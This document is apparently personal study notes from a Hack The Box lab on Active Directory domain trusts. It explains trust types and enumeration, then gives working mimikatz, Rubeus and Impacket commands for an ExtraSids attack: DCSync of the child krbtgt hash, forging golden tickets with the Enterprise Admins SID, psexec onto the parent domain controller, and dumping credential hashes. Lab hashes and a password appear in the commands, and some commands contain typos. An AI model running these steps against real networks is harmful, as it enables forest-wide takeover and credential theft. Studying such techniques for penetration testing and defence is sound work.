# domain trusts

    Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
    Cross-link: A trust between child domains to speed up authentication.
    External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
    Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
    Forest: A transitive trust between two forest root domains.
    ESAE: A bastion forest used to manage Active Directory.
- transitive trust establishes trust to child objects
- non-transitive only the direct transitive trust is trusted
```powershell
Import-Module ActiveDirectory
Get-ADTrust -Filter *
# powerview
get-DomainTrust
# if the trust is transitive we can enumerate the child domains with powerview
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
# enumerate trusts with netdom 
netdom query /domain:inlanefreight.local trust
# find domain controllers with accounts linked to this domain
netdom query /domain:inlanefreight.local dc
# workstation and servers
netdom query /domain:inlanefreight.local workstation
```
## sid history
Security Identifiers SID can be injected on an account so their token can have other privileges. SIDHistory is generally used for migration so accounts can be moved to another domain/forest and still have the same SIDs giving them access to the original domain.
# ExtraSids Attack -Mimikatz
- compromise the parent domain once the child domain is compromised
- Sid Filtering can protect against confusion accross forests and domains
- example if a user has the SID in their history for Enterprise admins which only exists on the parent domain, they will have complete forest control
### need
1. KRBTGT hash of the child domain
2. SID of the child domain
3. name of target user (can be nonexistant)
4. FQDN of child domain
5. SID of the Enterprise Admins group on parent domain
6. mimikatz
- get the KRBTGT hash of the child domain using mimikatz or rubedogg
```powershell
# mimikatz
log log.file
lsadump::dcsycn /user:LOGISTICS\krbtgt
# use powerview to get Domain SID
Get-DomainSID
# Get Enterprise Admins SID with Powerview or #Get-ADGroup
# Powerview
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
# Active Directory
Get-ADGroup -Identity "Enterprise Admins" -Server INLANEFREIGHT.LOCAL | select SID > inlanefreight.enterpriseadmins.sid
# mimikatz golden ticket using sids for inlane freight enterprise admin sid
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# same attack using Rubedogg
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# then we can do a dcsync as a domain admin account on the parent domain
# mimikatz
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

# Attacking domain trusts with linux

```bash
# using secretsdump.py to do a dcsync to get the hash of the krbtgt account
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
# with password and output file
secretsdump.py logistics.inlanefreigt.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.240 -just-dc-user LOGISTICS/krbtgt -outputfile logistics.krbtgt
# brute force the sids to get the child domain sid
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# with password and output file
lookupsid.py logistics.inlanefreight.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.240 | grep "Domain SID" > logistics.domain.sid

# get the enterprise admins sid using the command and add it to the domain (parent) sid with -<ent admins sid>
  
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
# create golden ticket with ticketer.py
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
# because we are on linux it will save to a ccache file 
export KRB5CCNAME=hacker.ccache 
# then use psexec from impacket to connect to the DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# raiseChild.py does the whole thing in one shebang
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# get the bross adminstrator hash from the parent domain with secretsdump.py
secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-user bross
```
